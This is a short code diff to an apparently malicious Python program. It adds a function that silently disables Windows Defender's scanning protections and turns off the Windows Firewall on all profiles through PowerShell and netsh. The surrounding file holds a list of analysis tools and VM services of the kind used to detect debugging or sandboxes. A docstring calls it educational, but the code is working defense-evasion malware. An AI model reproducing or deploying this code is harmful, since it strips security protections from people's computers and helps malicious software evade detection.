@@ -1,5 +1,21 @@
 import sys
 import psutil
+import subprocess
+
+def disable_defender_and_firewall():
+    """
+    Disables Windows Defender and the Windows Firewall.
+    Only for educational use in a test VM!
+    """
+    cmd = (
+        "powershell Set-MpPreference -DisableRealtimeMonitoring $true "
+        "-DisableArchiveScanning $true -DisableBehaviorMonitoring $true "
+        "-DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true "
+        "-DisableScriptScanning $true -EnableControlledFolderAccess Disabled; "
+        "netsh Advfirewall set allprofiles state off"
+    )
+    subprocess.run(cmd, shell=True, capture_output=True)
+
 
 SUSPICIOUS_PROCESSES = [
     "httpdebuggerui", "wireshark", "fiddler", "regedit", "cmd", "taskmgr", "vboxservice",
